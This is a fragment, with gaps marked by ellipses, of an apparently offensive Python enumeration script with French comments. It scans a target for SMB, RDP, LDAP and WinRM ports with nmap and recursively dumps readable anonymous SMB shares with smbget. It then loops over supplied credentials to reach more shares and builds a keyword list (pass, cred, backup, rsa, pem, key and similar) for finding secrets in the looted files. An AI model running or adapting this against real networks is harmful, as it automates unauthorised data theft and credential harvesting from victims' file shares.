...
os.system(f'nmap {ip_to_scan} -p 22,139,389,445,5985 -Pn | grep open > nmap_scan.txt; nmap {ip_to_scan} -p 3389 -sC -Pn >> nmap_scan.txt')
...
if smb==1:
		...
		if len(co) >1:
			...
			# on dump all ici!
			print("")
			os.system("cat shares/anonymous_shares.txt | grep READ | cut -f2 > shares/shares_.txt")
			...
			for share in shares:
				share=share.replace("\n","")
				share=share.replace(" ","")
				print(yellow+f"Dumping {share}	Could take a while..."+white)
				os.system(f"smbget -a -R  smb://{ip_to_scan}/{share} > /dev/null")
	...
	for cred in contenu:
		...
		if smb:
			...
			with open(f"shares/shares_{user}.txt","r") as fichier3:
				shares=fichier3.readlines()
			os.chdir("smb_dump")
			file_content="admin,account,compte,cred,user,pass,util,backup,note,vbs,ps1,bat,exe,conf,cfg,rsa,pem,key,xml,xslx,doc,docx,id,txt".split(",")
			for share in shares:
				share=share.replace("\n","")
				share=share.replace(" ","")
